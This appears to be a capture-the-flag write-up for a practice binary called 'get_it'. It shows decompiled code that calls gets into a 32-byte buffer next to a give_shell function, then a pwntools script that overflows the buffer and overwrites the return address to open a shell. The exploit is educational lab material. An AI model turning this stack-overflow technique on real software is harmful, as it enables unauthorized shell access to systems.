In Ghidra:
```c
undefined8 main(void)
{
  char local_28 [32];
  
  puts("Do you gets it??");
  gets(local_28);
  return 0;
}
```

We also find the following function:
```c
void give_shell(void)
{
  system("/bin/bash");
  return;
}
```

In the main function, we notice that it is using `gets`, which is vulnerable because it doesn't check the size of the input. Thus, our attack strategy is to overwrite the return address to call `give_shell`. We find the offset using GDB (with a similar strategy + **pitfall** as to [[CSAW'16 Quals- Warmup#^68e764]]) and write our exploit:
```python
from pwn import process, p64

target = process("./get_it")

payload = b"A" * 0x28
payload += p64(0x004005ba)

target.sendline(payload)
target.interactive()
```

**No flag here, just getting a shell!**
